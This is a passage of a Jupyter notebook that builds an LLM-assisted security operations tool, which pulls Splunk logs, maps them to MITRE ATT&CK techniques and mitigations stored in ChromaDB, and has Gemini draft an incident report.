    "import os\n",
    "import time\n",
    "import json\n",
    "from dotenv import load_dotenv\n",
    "\n",
    "# Splunk SDK imports\n",
    "import splunklib.client as client\n",
    "import splunklib.results as results\n",
    "\n",
    "# ChromaDB import\n",
    "import chromadb\n",
    "\n",
    "# Google Gemini imports\n",
    "import google.generativeai as genai\n",
    "\n",
    "# STIX2 imports for MITRE ATT&CK parsing\n",
    "from stix2 import MemoryStore, Filter, AttackPattern, Relationship\n",
    "\n",
    "# Load environment variables from app.env file\n",
    "load_dotenv(\"app.env\")\n",
    "\n",
    "# --- Configuration ---\n",
    "SPLUNK_HOST = os.environ.get(\"SPLUNK_HOST\", \"127.0.0.1\")\n",
    "SPLUNK_PORT = int(os.environ.get(\"SPLUNK_PORT\", 8089))\n",
    "SPLUNK_USERNAME = os.environ.get(\"SPLUNK_USERNAME\", \"admin\")\n",
    "SPLUNK_PASSWORD = os.environ.get(\"SPLUNK_PASSWORD\", \"changeme\") # IMPORTANT: Update this in app.env\n",
    "SPLUNK_TOKEN = os.environ.get(\"SPLUNK_TOKEN\") # Optional, not used in current connect_to_splunk\n",
    "\n",
    "GEMINI_API_KEY = os.environ.get(\"GEMINI_API_KEY\")\n",
    "if not GEMINI_API_KEY:\n",
    "    raise ValueError(\"GEMINI_API_KEY environment variable not set. Get your key from Google AI Studio (https://makersuite.google.com/).\")\n",
    "\n",
    "# Configure Google Gemini\n",
    "genai.configure(api_key=GEMINI_API_KEY)\n",
    "llm = genai.GenerativeModel('gemini-2.0-flash') # For text generation\n",
    "embedding_model = 'embedding-001' # For embeddings\n",
    "\n",
    "# ChromaDB Settings\n",
    "CHROMA_DB_PATH = \"./chroma_db\"\n",
    "chroma_client = chromadb.PersistentClient(path=CHROMA_DB_PATH)\n",
    "SECURITY_COLLECTION_NAME = \"security_knowledge\"\n",
    "security_collection = chroma_client.get_or_create_collection(SECURITY_COLLECTION_NAME)\n",
    "\n",
    "# MITRE ATT&CK Data File Path\n",
    "MITRE_STIX_JSON_PATH = \"enterprise-attack.json\" # Ensure this file is in the same directory as this script\n",
    "\n",
    "# --- Splunk Connection & Query Functions ---\n",
    "def connect_to_splunk():\n",
    "    \"\"\"Connects to Splunk and returns a Service object.\"\"\"\n",
    "    connection_url = f\"https://{SPLUNK_HOST}:{SPLUNK_PORT}\"\n",
    "    print(f\"Attempting to connect to Splunk at {connection_url}...\")\n",
    "    try:\n",
    "        service = client.connect(\n",
    "            host=SPLUNK_HOST,\n",
    "            port=SPLUNK_PORT,\n",
    "            username=SPLUNK_USERNAME,\n",
    "            password=SPLUNK_PASSWORD,\n",
    "            scheme=\"https\", # Changed from http - Crucial for 8089\n",
    "            verify=False # IMPORTANT: For testing with self-signed certs. Use True with a proper CA bundle in production!\n",
    "        )\n",
    "        print(\"Successfully connected to Splunk.\")\n",
    "        return service\n",
    "    except Exception as e:\n",
    "        print(f\"Error connecting to Splunk: {e}\")\n",
    "        return None\n",
    "\n",
    "def run_splunk_query(service, query, output_mode=\"json\"):\n",
    "    \"\"\"\n",
    "    Runs a Splunk search query and returns the results.\n",
    "    \"\"\"\n",
    "    print(f\"Attempting to run Splunk query:\\n```\\n{query}\\n```\")\n",
    "    try:\n",
    "        kwargs = {\n",
    "            \"output_mode\": output_mode,\n",
    "            \"app\": \"search\"\n",
    "        }\n",
    "        job = service.jobs.create(query, **kwargs)\n",
    "\n",
    "        print(f\"Splunk Job ID: {job.sid}\")\n",
    "        # Wait for the job to complete\n",
    "        max_wait_time = 120 # seconds, e.g., 2 minutes. Adjust as needed.\n",
    "        start_time = time.time()\n",
    "\n",
    "        while not job.is_ready():\n",
    "            time.sleep(0.5) # Increased sleep from 0.1 to 0.5 seconds\n",
    "            # Print the current dispatch state of the job for more detailed debugging\n",
    "            print(f\"Job {job.sid} status: {job.content.get('dispatchState')}\")\n",
    "            \n",
    "            if time.time() - start_time > max_wait_time:\n",
    "                print(f\"Job {job.sid} timed out after {max_wait_time} seconds. Current status: {job.content.get('dispatchState')}\")\n",
    "                job.cancel() # Attempt to cancel the job on Splunk\n",
    "                return [] # Return empty list if timeout occurs\n",
    "\n",
    "        # After job is ready, check if it's done or if there are messages\n",
    "        if job.is_done():\n",
    "            print(f\"Splunk search job {job.sid} is DONE. Final dispatch state: {job.content.get('dispatchState')}\")\n",
    "            if job.messages: # Check for messages even if done (warnings, etc.)\n",
    "                print(f\"Job {job.sid} messages: {job.messages}\")\n",
    "\n",
    "            reader = results.ResultsReader(job.results())\n",
    "            events = []\n",
    "            for item in reader:\n",
    "                events.append(item)\n",
    "            job.cancel() # Clean up the search job to free resources on Splunk\n",
    "            print(f\"Successfully retrieved {len(events)} events from Splunk for Job ID {job.sid}.\")\n",
    "            return events\n",
    "        else: # This block handles cases where the job might not complete successfully\n",
    "            print(f\"Splunk search job {job.sid} did not complete successfully. Final status: {job.content.get('dispatchState')}\")\n",
    "            if job.messages: # Print any error/warning messages\n",
    "                print(f\"Job {job.sid} messages: {job.messages}\")\n",
    "            job.cancel()\n",
    "            return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error running Splunk query: {e}\")\n",
    "        return []\n",
    "    \n",
    "# --- Embedding & ChromaDB Functions ---\n",
    "def get_embedding(text):\n",
    "    \"\"\"Generates an embedding for the given text using the specified Gemini embedding model.\"\"\"\n",
    "    try:\n",
    "        # Use RETRIEVAL_DOCUMENT for texts meant to be retrieved (like knowledge base entries)\n",
    "        response = genai.embed_content(model=embedding_model, content=text, task_type=\"RETRIEVAL_DOCUMENT\")\n",
    "        return response['embedding']\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating embedding for text (first 50 chars): '{text[:50]}...': {e}\")\n",
    "        return None\n",
    "\n",
    "def load_mitre_attack_data(stix_json_path=MITRE_STIX_JSON_PATH):\n",
    "    \"\"\"\n",
    "    Loads MITRE ATT&CK techniques AND their associated mitigations from a STIX 2.x JSON file.\n",
    "    \"\"\"\n",
    "    print(f\"Loading MITRE ATT&CK data from {stix_json_path} using stix2...\")\n",
    "    try:\n",
    "        stix_store = MemoryStore()\n",
    "        stix_store.load_from_file(stix_json_path)\n",
    "        print(\"STIX store loaded successfully.\") # Debug print\n",
    "\n",
    "        # --- DEBUGGING MITIGATIONS (These are good, keep them to confirm) ---\n",
    "        all_mitigations_raw = stix_store.query(Filter(\"type\", \"=\", \"course-of-action\"))\n",
    "        print(f\"DEBUG: Found {len(all_mitigations_raw)} raw 'course-of-action' objects in the STIX file.\")\n",
    "\n",
    "        all_relationships_raw = stix_store.query(Filter(\"type\", \"=\", \"relationship\"))\n",
    "        print(f\"DEBUG: Found {len(all_relationships_raw)} raw 'relationship' objects in the STIX file.\")\n",
    "\n",
    "        mitigates_relationships_raw = stix_store.query(Filter(\"relationship_type\", \"=\", \"mitigates\"))\n",
    "        print(f\"DEBUG: Found {len(mitigates_relationships_raw)} raw 'mitigates' relationships.\")\n",
    "        # --- END DEBUGGING MITIGATIONS ---\n",
    "        \n",
    "        attack_data_points = []\n",
    "        mitigation_data_points = []\n",
    "\n",
    "        # --- NEW STRATEGY: Load all mitigations (course-of-action objects) first ---\n",
    "        # This creates a map from STIX ID to mitigation details for easy lookup\n",
    "        mitigations_map = {}\n",
    "        for miti_sdo in all_mitigations_raw:\n",
    "            chroma_mitigation_id = miti_sdo.id\n",
    "            display_mitigation_id = miti_sdo.id # Default\n",
    "            \n",
    "            for ext_ref in miti_sdo.external_references:\n",
    "                if ext_ref.get('source_name') == 'mitre-attack' and 'external_id' in ext_ref:\n",
    "                    if ext_ref['external_id'].startswith('M'):\n",
    "                        display_mitigation_id = ext_ref['external_id']\n",
    "                        break # Prefer M-ID\n",
    "                    elif ext_ref['external_id'].startswith('T') and not display_mitigation_id.startswith('M'):\n",
    "                        # Only use T-ID if no M-ID was found\n",
    "                        display_mitigation_id = ext_ref['external_id']\n",
    "                        \n",
    "            mitigation_description = miti_sdo.description if hasattr(miti_sdo, 'description') else \"No description available.\"\n",
    "            \n",
    "            full_mitigation_text = (\n",
    "                f\"MITRE ATT&CK Mitigation: {miti_sdo.name} (ID: {display_mitigation_id})\\n\"\n",
    "                f\"Description: {mitigation_description}\"\n",
    "                # We won't add \"Mitigates Technique:\" here directly, as a mitigation can mitigate multiple.\n",
    "                # This info is better for prompt context when reporting.\n",
    "            )\n",
    "            \n",
    "            mitigation_data_points.append({\n",
    "                \"id\": chroma_mitigation_id,\n",
    "                \"text\": full_mitigation_text,\n",
    "                \"metadata\": {\n",
    "                    \"type\": \"mitre_attack_mitigation\",\n",
    "                    \"mitigation_stix_id\": miti_sdo.id,\n",
    "                    \"mitigation_id_external\": display_mitigation_id,\n",
    "                    \"mitigation_name\": miti_sdo.name,\n",
    "                    \"source_file\": stix_json_path\n",
    "                }\n",
    "            })\n",
    "            mitigations_map[miti_sdo.id] = {\n",
    "                \"name\": miti_sdo.name,\n",
    "                \"id_external\": display_mitigation_id,\n",
    "                \"description\": mitigation_description\n",
    "            }\n",
    "        # --- END NEW STRATEGY for Mitigations ---\n",
    "\n",
    "\n",
    "        # Query for all Attack Pattern objects (techniques)\n",
    "        techniques = stix_store.query(Filter(\"type\", \"=\", \"attack-pattern\"))\n",
    "        print(f\"DEBUG: Found {len(techniques)} 'attack-pattern' objects.\") # Debug print\n",
    "\n",
    "        for tech in techniques:\n",
    "            mitre_id = None\n",
    "            for ext_ref in tech.external_references:\n",
    "                if ext_ref.get('source_name') == 'mitre-attack' and 'external_id' in ext_ref:\n",
    "                    if ext_ref['external_id'].startswith('T'):\n",
    "                        mitre_id = ext_ref['external_id']\n",
    "                        break\n",
    "            if not mitre_id:\n",
    "                continue\n",
    "\n",
    "            description = tech.description if hasattr(tech, 'description') else \"No description available.\"\n",
    "            \n",
    "            tactics_names = []\n",
    "            if hasattr(tech, 'x_mitre_tactic_refs'):\n",
    "                for tactic_ref_id in tech.x_mitre_tactic_refs:\n",
    "                    tactic_sdo = stix_store.get(tactic_ref_id)\n",
    "                    if tactic_sdo and tactic_sdo.type == 'tactic':\n",
    "                        tactics_names.append(tactic_sdo.name)\n",
    "            tactics_str = ', '.join(tactics_names) if tactics_names else 'N/A'\n",
    "            \n",
    "            # Construct full text for embedding for techniques\n",
    "            full_tech_text = (\n",
    "                f\"MITRE ATT&CK Technique: {tech.name} (ID: {mitre_id})\\n\"\n",
    "                f\"Tactics: {tactics_str}\\n\"\n",
    "                f\"Description: {description}\\n\"\n",
    "                f\"URL: {tech.external_references[0]['url'] if tech.external_references else 'N/A'}\"\n",
    "            )\n",
    "            \n",
    "            attack_data_points.append({\n",
    "                \"id\": mitre_id,\n",
    "                \"text\": full_tech_text,\n",
    "                \"metadata\": {\n",
    "                    \"type\": \"mitre_attack_technique\",\n",
    "                    \"technique_id\": mitre_id,\n",
    "                    \"technique_name\": tech.name,\n",
    "                    \"tactics\": tactics_str,\n",
    "                    \"is_subtechnique\": tech.x_mitre_is_subtechnique if hasattr(tech, 'x_mitre_is_subtechnique') else False,\n",
    "                    \"source_file\": stix_json_path\n",
    "                }\n",
    "            })\n",
    "\n",
    "            # We already populated mitigation_data_points with all mitigations.\n",
    "            # The relationship is primarily for search context/linking if needed later.\n",
    "            # We don't need to iterate through mitigation_relationships again here to ADD them.\n",
    "            # The relationships will be used by the LLM logic to find *relevant* mitigations.\n",
    "\n",
    "        print(f\"Loaded {len(attack_data_points)} MITRE ATT&CK techniques.\")\n",
    "        print(f\"Loaded {len(mitigation_data_points)} MITRE ATT&CK mitigations.\")\n",
    "\n",
    "        return attack_data_points + mitigation_data_points # Combine for single populate call\n",
    "\n",
    "    except FileNotFoundError:\n",
    "        print(f\"Error: MITRE ATT&CK STIX JSON file not found at '{stix_json_path}'\")\n",
    "        print(\"Please download 'enterprise-attack.json' from https://attack.mitre.org/resources/attack-data-and-tools/ and place it in the script's directory.\")\n",
    "        return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error loading MITRE ATT&CK data: {e}\")\n",
    "        return []    \n",
    "    except FileNotFoundError:\n",
    "        print(f\"Error: MITRE ATT&CK STIX JSON file not found at '{stix_json_path}'\")\n",
    "        print(\"Please download 'enterprise-attack.json' from https://attack.mitre.org/resources/attack-data-and-tools/ and place it in the script's directory.\")\n",
    "        return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error loading MITRE ATT&CK data: {e}\")\n",
    "        return []\n",
    "\n",
    "def populate_security_knowledge_base(data_points):\n",
    "    \"\"\"Populates the ChromaDB collection with security knowledge data points, avoiding duplicates.\"\"\"\n",
    "    print(f\"Attempting to add {len(data_points)} documents to the knowledge base.\")\n",
    "    \n",
    "    # Get existing IDs to prevent adding duplicates\n",
    "    existing_ids_result = security_collection.get(include=[])\n",
    "    existing_ids = set(existing_ids_result.get('ids', []))\n",
    "\n",
    "    docs_to_add = []\n",
    "    embeddings_to_add = []\n",
    "    metadatas_to_add = []\n",
    "    ids_to_add = []\n",
    "\n",
    "    for dp in data_points:\n",
    "        unique_id = dp.get(\"id\")\n",
    "        if not unique_id:\n",
    "            # Generate a unique ID if not provided (e.g., for custom knowledge)\n",
    "            unique_id = f\"custom_knowledge_{hash(dp['text'])}\"\n",
    "\n",
    "        if unique_id in existing_ids:\n",
    "            # print(f\"Skipping existing document with ID: {unique_id}\") # Uncomment for verbose debugging\n",
    "            continue\n",
    "\n",
    "        embedding = get_embedding(dp[\"text\"])\n",
    "        if embedding is not None: # Ensure embedding was successfully generated\n",
    "            docs_to_add.append(dp[\"text\"])\n",
    "            embeddings_to_add.append(embedding)\n",
    "            metadatas_to_add.append(dp.get(\"metadata\", {}))\n",
    "            ids_to_add.append(unique_id)\n",
    "        else:\n",
    "            print(f\"Skipping document due to embedding failure: {dp['text'][:50]}...\")\n",
    "\n",
    "    if docs_to_add:\n",
    "        try:\n",
    "            security_collection.add(\n",
    "                documents=docs_to_add,\n",
    "                embeddings=embeddings_to_add,\n",
    "                metadatas=metadatas_to_add,\n",
    "                ids=ids_to_add\n",
    "            )\n",
    "            print(f\"Populated vector store with {len(docs_to_add)} new security knowledge documents.\")\n",
    "        except Exception as e:\n",
    "            print(f\"Error adding documents to ChromaDB: {e}\")\n",
    "    else:\n",
    "        print(\"No new unique documents to add to the vector store.\")\n",
    "\n",
    "def search_security_knowledge_base(query_text, n_results=5, filter_metadata=None):\n",
    "    \"\"\"\n",
    "    Searches the ChromaDB knowledge base for relevant documents.\n",
    "    Args:\n",
    "        query_text (str): The text to search for.\n",
    "        n_results (int): Number of results to return.\n",
    "        filter_metadata (dict, optional): A dictionary to filter results by metadata.\n",
    "                                          E.g., {\"type\": \"mitre_attack_technique\"}.\n",
    "    Returns:\n",
    "        dict: ChromaDB query results (documents, distances, metadatas).\n",
    "    \"\"\"\n",
    "    query_embedding = get_embedding(query_text)\n",
    "    if query_embedding is not None:\n",
    "        results = security_collection.query(\n",
    "            query_embeddings=[query_embedding],\n",
    "            n_results=n_results,\n",
    "            include=['documents', 'distances', 'metadatas'],\n",
    "            where=filter_metadata # Apply metadata filtering if provided\n",
    "        )\n",
    "        return results\n",
    "    return None\n",
    "\n",
    "# --- AI Report Generation Function ---\n",
    "def generate_incident_report(splunk_logs, relevant_knowledge, mitre_mappings, incident_summary=\"\"):\n",
    "    \"\"\"\n",
    "    Generates a comprehensive security incident report using Gemini.\n",
    "    `relevant_knowledge` now primarily contains suggested mitigations.\n",
    "    \"\"\"\n",
    "    # Format MITRE details for the prompt\n",
    "    mitre_details_str = \"\"\n",
    "    if mitre_mappings:\n",
    "        mitre_details_str = \"\\n**Potential MITRE ATT&CK Mappings:**\\n\"\n",
    "        for mapping in mitre_mappings:\n",
    "            mitre_details_str += f\"* **Technique:** {mapping.get('technique_name', 'N/A')} ({mapping.get('technique_id', 'N/A')})\\n\"\n",
    "            if mapping.get('tactics') and mapping['tactics'] != 'N/A':\n",
    "                mitre_details_str += f\"  **Tactics:** {mapping['tactics']}\\n\"\n",
    "            description_text = str(mapping.get('description', 'No description.')).strip()\n",
    "            # Extract just the MITRE technique description for brevity in report\n",
    "            clean_description = description_text.split(\"Description: \")[1].split(\"\\nURL:\")[0].strip() if \"Description: \" in description_text else description_text\n",
    "            mitre_details_str += f\"  **Description:** {clean_description[:200]}...\\n\"\n",
    "            mitre_details_str += f\"  **Confidence (similarity score):** {mapping.get('distance_score', 0.0):.4f}\\n\"\n",
    "\n",
    "    # Main prompt for Gemini\n",
    "    prompt = f\"\"\"\n",
    "You are an AI-driven SOC analyst assistant. Your task is to generate a concise and informative incident report based on the provided Splunk logs, potential MITRE ATT&CK mappings, and recommended mitigations.\n",
    "\n",
    "---\n",
    "**Splunk Logs (Raw Data for Context):**\n",
    "{splunk_logs}\n",
    "\n",
    "---\n",
    "**Potential MITRE ATT&CK Mappings (Most Relevant First):**\n",
    "{mitre_details_str if mitre_details_str else \"No specific MITRE ATT&CK mappings found or provided. Analyze logs for common adversary behaviors.\"}\n",
    "\n",
    "---\n",
    "**Recommended Mitigations (from Knowledge Base):**\n",
    "{relevant_knowledge if relevant_knowledge else \"No specific mitigation recommendations found. Consider general security best practices.\"}\n",
    "\n",
    "---\n",
    "**Incident Summary (if provided by human analyst):**\n",
    "{incident_summary if incident_summary else \"No specific summary provided, analyze logs for key details.\"}\n",
    "\n",
    "---\n",
    "**Instructions for Report Generation:**\n",
    "1.  **Incident Title:** Create a clear and descriptive title for the incident.\n",
    "2.  **Date/Time of Detection:** Extract the earliest and latest timestamps from the logs. Provide a range if multiple times.\n",
    "3.  **Affected Systems/Users:** Identify specific hosts, IP addresses, or users mentioned in the logs.\n",
    "4.  **Description of Incident:** Summarize the observed events chronologically. **Crucially, explain how the observed behavior aligns with the most relevant MITRE ATT&CK Tactics and Techniques, referencing their IDs and names from the provided mappings.**\n",
    "5.  **Attack Vector/Technique (MITRE ATT&CK IDs and names):** Explicitly list the *most relevant* MITRE ATT&CK Tactics and Techniques identified (e.g., \"T1078 - Valid Accounts, T1110 - Brute Force\").\n",
    "6.  **Impact:** Briefly describe the potential impact of this incident (e.g., data breach, service disruption, account compromise, unauthorized access).\n",
    "7.  **Recommended Actions/Remediation:** Based on the identified MITRE techniques and the **\"Recommended Mitigations\"** section, suggest immediate and long-term actions for containment, eradication, and recovery. If no specific mitigations are found, provide general best practices based on the MITRE techniques.\n",
    "8.  **Status:** (e.g., New Incident, In Progress, Contained, Resolved) - Default to \"New Incident\" if unsure.\n",
    "9.  **Analyst Notes:** Any other observations, open questions, or next steps for further investigation.\n",
    "\n",
    "Please present the report in a clear, markdown-formatted structure, focusing on actionable intelligence.\n",
    "\"\"\"\n",
    "    try:\n",
    "        response = llm.generate_content(prompt)\n",
    "        return response.text\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating incident report with Gemini: {e}\")\n",
    "        return \"Failed to generate incident report.\"\n",
    "\n",
    "# --- Main Orchestration Logic ---\n",
    "def ai_soc_analyst_assistant(splunk_query, incident_summary=\"\", distance_threshold=0.3):\n",
    "    print(f\"--- Starting AI SOC Analyst Assistant for query ---\")\n",
    "    print(f\"DEBUG: Splunk query string:\\n```\\n{splunk_query}\\n```\")\n",
    "\n",
    "    splunk_service = connect_to_splunk()\n",
    "\n",
    "    if splunk_service:\n",
    "        print(f\"DEBUG: Successfully obtained Splunk service object. Type: {type(splunk_service)}\")\n",
    "    else:\n",
    "        print(\"DEBUG: Splunk service object is None. Connection likely failed or returned None.\")\n",
    "        return \"Failed to connect to Splunk. Cannot proceed.\"\n",
    "\n",
    "    print(\"Retrieving data from Splunk...\")\n",
    "    raw_splunk_events = run_splunk_query(splunk_service, splunk_query )\n",
    "\n",
    "    if not raw_splunk_events:\n",
    "        print(\"No relevant Splunk logs found for the given query.\")\n",
    "        return generate_incident_report(\"No logs retrieved.\", \"No relevant knowledge.\", [], incident_summary)\n",
    "\n",
    "    combined_log_text = \" \".join([event.get('_raw', '') for event in raw_splunk_events])\n",
    "\n",
    "    # relevant_knowledge_text will specifically contain mitigations now\n",
    "    relevant_knowledge_text = \"\" \n",
    "\n",
    "    # Search for relevant MITRE ATT&CK techniques\n",
    "    mitre_search_results = search_security_knowledge_base(\n",
    "        combined_log_text, \n",
    "        n_results=5, \n",
    "        filter_metadata={\"type\": \"mitre_attack_technique\"} # Explicitly search only techniques\n",
    "    )\n",
    "    \n",
    "    mitre_mappings = []\n",
    "    if mitre_search_results and mitre_search_results['documents']:\n",
    "        for i in range(len(mitre_search_results['documents'][0])):\n",
    "            doc = mitre_search_results['documents'][0][i]\n",
    "            meta = mitre_search_results['metadatas'][0][i]\n",
    "            dist = mitre_search_results['distances'][0][i]\n",
    "\n",
    "            # Similarity is 1 - (distance^2 / 2) for normalized vectors and Euclidean (L2) distance\n",
    "            similarity_score = 1 - (dist**2 / 2) \n",
    "            \n",
    "            if similarity_score > 0.7: # Threshold for considering a MITRE mapping relevant\n",
    "                mitre_mappings.append({\n",
    "                    \"technique_id\": meta.get('technique_id'),\n",
    "                    \"technique_name\": meta.get('technique_name'),\n",
    "                    \"tactics\": meta.get('tactics'),\n",
    "                    \"description\": doc, # The full text of the document\n",
    "                    \"distance_score\": similarity_score # Pass the calculated similarity\n",
    "                })\n",
    "\n",
    "    # --- NEW: Search for relevant MITRE ATT&CK Mitigations ---\n",
    "    # This search uses a higher threshold or different strategy as it's for 'recommended actions'\n",
    "    # The query for mitigations could be based on the identified techniques or the raw log text.\n",
    "    # Let's try searching based on the identified techniques for more relevant mitigations.\n",
    "    mitigations_text_to_query = \"\"\n",
    "    if mitre_mappings:\n",
    "        mitigations_text_to_query = \" \".join([m['description'] for m in mitre_mappings])\n",
    "    else:\n",
    "        mitigations_text_to_query = combined_log_text # Fallback to raw logs if no techniques found\n",
    "\n",
    "    relevant_mitigations_results = search_security_knowledge_base(\n",
    "        mitigations_text_to_query,\n",
    "        n_results=3, # Get top 3 most relevant mitigations\n",
    "        filter_metadata={\"type\": \"mitre_attack_mitigation\"} # Explicitly search only mitigations\n",
    "    )\n",
    "    \n",
    "    if relevant_mitigations_results and relevant_mitigations_results['documents']:\n",
    "        relevant_knowledge_text = \"\\n**Recommended Mitigations (from MITRE ATT&CK):**\\n\"\n",
    "        for i in range(len(relevant_mitigations_results['documents'][0])):\n",
    "            doc = relevant_mitigations_results['documents'][0][i]\n",
    "            meta = relevant_mitigations_results['metadatas'][0][i]\n",
    "            dist = relevant_mitigations_results['distances'][0][i]\n",
    "            similarity_score = 1 - (dist**2 / 2) # Assuming normalized vectors and Euclidean (L2) distance\n",
    "\n",
    "            if similarity_score > 0.6: # A slightly lower threshold for suggesting mitigations\n",
    "                # Use 'mitigation_name' and 'mitigation_id_external' for display\n",
    "                mitigation_name = meta.get('mitigation_name', 'N/A')\n",
    "                mitigation_id_for_display = meta.get('mitigation_id_external', meta.get('mitigation_stix_id', 'N/A'))\n",
    "                \n",
    "                # Extract description neatly\n",
    "                description_start_index = doc.find(\"Description: \")\n",
    "                description_end_index = doc.find(\"Mitigates Technique STIX ID:\")\n",
    "                clean_description = \"No description available.\"\n",
    "                if description_start_index != -1 and description_end_index != -1:\n",
    "                    clean_description = doc[description_start_index + len(\"Description: \"):description_end_index].strip()\n",
    "                elif description_start_index != -1: # If 'Mitigates Technique' part isn't there\n",
    "                    clean_description = doc[description_start_index + len(\"Description: \"):].strip()\n",
    "                \n",
    "                relevant_knowledge_text += (\n",
    "                    f\"* **Mitigation:** {mitigation_name} (ID: {mitigation_id_for_display})\\n\"\n",
    "                    f\"  **Description:** {clean_description[:200]}...\\n\" # Extract just description\n",
    "                    f\"  **Similarity Score:** {similarity_score:.4f}\\n\"\n",
    "                )\n",
    "    \n",
    "    # Generate the final report\n",
    "    report = generate_incident_report(\n",
    "        \"\\n\".join([event.get('_raw', '') for event in raw_splunk_events]),\n",
    "        relevant_knowledge_text, # Pass the found mitigations as \"relevant_knowledge\"\n",
    "        mitre_mappings,\n",
    "        incident_summary\n",
    "    )\n",
    "    return report\n",
    "\n",
    "\n",
    "# --- Main Execution Block ---\n",
    "if __name__ == \"__main__\":\n",
    "    print(\"--- Starting AI SOC Analyst Assistant (Full Architecture) ---\")\n",
    "\n",
    "    # --- Step 0: Ensure Security Knowledge Base is Populated ---\n",
    "    print(\"\\n--- Checking/Populating Security Knowledge Base ---\")\n",
    "    \n",
    "    # Check if MITRE data (techniques and mitigations) needs to be populated\n",
    "    total_docs_in_db = security_collection.count()\n",
    "    needs_mitre_population = False\n",
    "    \n",
    "    if total_docs_in_db == 0:\n",
    "        needs_mitre_population = True\n",
    "        print(\"ChromaDB collection is currently empty. Populating MITRE ATT&CK techniques and mitigations.\")\n",
    "    else:\n",
    "        # Corrected way to check counts of specific types in ChromaDB\n",
    "        try:\n",
    "            # We get all IDs for specific types and then count them\n",
    "            tech_ids = security_collection.get(where={\"type\": \"mitre_attack_technique\"}, include=[])['ids']\n",
    "            miti_ids = security_collection.get(where={\"type\": \"mitre_attack_mitigation\"}, include=[])['ids']\n",
    "            tech_count = len(tech_ids)\n",
    "            miti_count = len(miti_ids)\n",
    "            \n",
    "            # Use a more robust check: are there a *reasonable* number of each type?\n",
    "            # A full Enterprise ATT&CK v14 has ~600+ techniques and ~60+ mitigations.\n",
    "            # Adjust these thresholds based on your ATT&CK version and expectations.\n",
    "            # Using absolute numbers is better than just 0.\n",
    "            if tech_count < 500 or miti_count < 50: # Example: If less than 500 techniques or 50 mitigations\n",
    "                needs_mitre_population = True\n",
    "                print(f\"Insufficient MITRE ATT&CK data found (techniques: {tech_count}, mitigations: {miti_count}). Repopulating...\")\n",
    "            else:\n",
    "                print(f\"MITRE ATT&CK data (techniques: {tech_count}, mitigations: {miti_count}) already present.\")\n",
    "        except Exception as e:\n",
    "            print(f\"Warning: Error checking for existing MITRE data: {e}. Assuming MITRE data needs population.\")\n",
    "            # This can happen if the collection is truly empty or corrupted\n",
    "            needs_mitre_population = True\n",
    "\n",
    "    if needs_mitre_population:\n",
    "        # Clear existing collection if we are repopulating to ensure consistency\n",
    "        print(\"Clearing existing ChromaDB collection to repopulate with fresh MITRE data...\")\n",
    "        try:\n",
    "            # Delete and recreate the collection to ensure it's fresh\n",
    "            chroma_client.delete_collection(SECURITY_COLLECTION_NAME)\n",
    "        except Exception as e:\n",
    "            print(f\"Warning: Could not delete collection (might not exist or be empty): {e}\")\n",
    "        security_collection = chroma_client.get_or_create_collection(SECURITY_COLLECTION_NAME) # Recreate\n",
    "        \n",
    "        mitre_all_data_points = load_mitre_attack_data(stix_json_path=MITRE_STIX_JSON_PATH)\n",
    "        if mitre_all_data_points:\n",
    "            populate_security_knowledge_base(mitre_all_data_points)\n",
    "        else:\n",
    "            print(\"MITRE ATT&CK data not loaded from file. AI mapping might be less effective.\")\n",
    "    \n",
    "    # Removed the specific 'sample_security_knowledge' array and its population logic here.\n",
    "    # If you later want to add other custom knowledge (playbooks, past incidents) \n",
    "    # that are NOT MITRE techniques/mitigations, you would add them here using\n",
    "    # populate_security_knowledge_base with appropriate 'type' metadata (e.g., {\"type\": \"playbook\"}).\n",
    "\n",
    "    print(f\"\\nTotal unique documents in knowledge base: {security_collection.count()}\")\n",
    "\n",
    "    # --- Run a combined simulated scenario ---\n",
    "    # This Splunk query generates mock logs that hint at various security events.\n",
    "    splunk_simulated_logs =\"\"\"search index=\"main\" source=\"archive.zip:*\" host=\"DESKTOP-48V92VC\" \"Severity Level\"=\"Medium\" | head 10\"\"\"\n",
    "    \n",
    "\n",
    "    print(\"\\n\\n=== Running Combined Simulated Scenario (with MITRE Mapping) ===\")\n",
    "    incident_report = ai_soc_analyst_assistant(\n",
    "        splunk_simulated_logs,\n",
    "        incident_summary=\"Simulated multiple failed SSH login attempts, a successful login, an attempted SQL Injection, and an encoded PowerShell command on an endpoint.\"\n",
    "    )\n",
    "    print(\"\\n--- Final Incident Report ---\")\n",
    "    print(incident_report)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "50a38d98",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attempting to read file: enterprise-attack.json\n",
      "SUCCESS: Found '\"type\": \"course-of-action\"' in the file.\n",
      "Approximate number of 'course-of-action' entries: 268\n",
      "SUCCESS: Found '\"relationship_type\": \"mitigates\"' in the file.\n",
      "Approximate number of 'mitigates' relationships: 1421\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "\n",
    "file_path = \"enterprise-attack.json\" # Ensure this path is correct\n",
    "\n",
    "if os.path.exists(file_path):\n",
    "    print(f\"Attempting to read file: {file_path}\")\n",
    "    try:\n",
    "        with open(file_path, 'r', encoding='utf-8') as f:\n",
    "            content = f.read()\n",
    "            if '\"type\": \"course-of-action\"' in content:\n",
    "                print(\"SUCCESS: Found '\\\"type\\\": \\\"course-of-action\\\"' in the file.\")\n",
    "                # You can also count them to get an idea\n",
    "                count = content.count('\"type\": \"course-of-action\"')\n",
    "                print(f\"Approximate number of 'course-of-action' entries: {count}\")\n",
    "            else:\n",
    "                print(\"FAILURE: Did NOT find '\\\"type\\\": \\\"course-of-action\\\"' in the file.\")\n",
    "                print(\"This strongly indicates the file is not the correct MITRE ATT&CK STIX data with mitigations.\")\n",
    "            \n",
    "            if '\"relationship_type\": \"mitigates\"' in content:\n",
    "                print(\"SUCCESS: Found '\\\"relationship_type\\\": \\\"mitigates\\\"' in the file.\")\n",
    "                count_mitigates = content.count('\"relationship_type\": \"mitigates\"')\n",
    "                print(f\"Approximate number of 'mitigates' relationships: {count_mitigates}\")\n",
    "            else:\n",
    "                print(\"FAILURE: Did NOT find '\\\"relationship_type\\\": \\\"mitigates\\\"' in the file.\")\n",
    "                print(\"This strongly indicates the file is missing the relationships necessary for linking techniques to mitigations.\")\n",
    "\n",
    "    except Exception as e:\n",
    "        print(f\"Error reading file: {e}\")\n",
